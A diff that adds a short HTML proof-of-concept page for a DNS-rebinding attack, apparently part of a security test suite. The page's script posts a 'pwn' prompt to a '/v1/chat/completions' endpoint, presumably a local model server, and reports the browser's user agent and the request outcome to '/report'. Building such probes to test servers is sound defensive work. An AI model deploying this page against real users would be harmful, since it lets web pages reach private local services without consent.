@@ -1,0 +1,16 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>attack B - DNS rebind, same-origin</title>
+<script>
+function report(k, v) {
+  fetch("/report", {method: "POST", headers: {"Content-Type": "text/plain"},
+    body: JSON.stringify({k: k, v: v})});
+}
+report("page-loaded", navigator.userAgent);
+fetch("/v1/chat/completions", {
+  method: "POST",
+  headers: {"Content-Type": "text/plain"},
+  body: JSON.stringify({model: "m", messages: [{role: "user", content: "pwn"}]})
+}).then(function (r) { report("fetch-resolved", "type=" + r.type + " status=" + r.status); })
+  .catch(function (e) { report("fetch-rejected", String(e)); });
+</script>
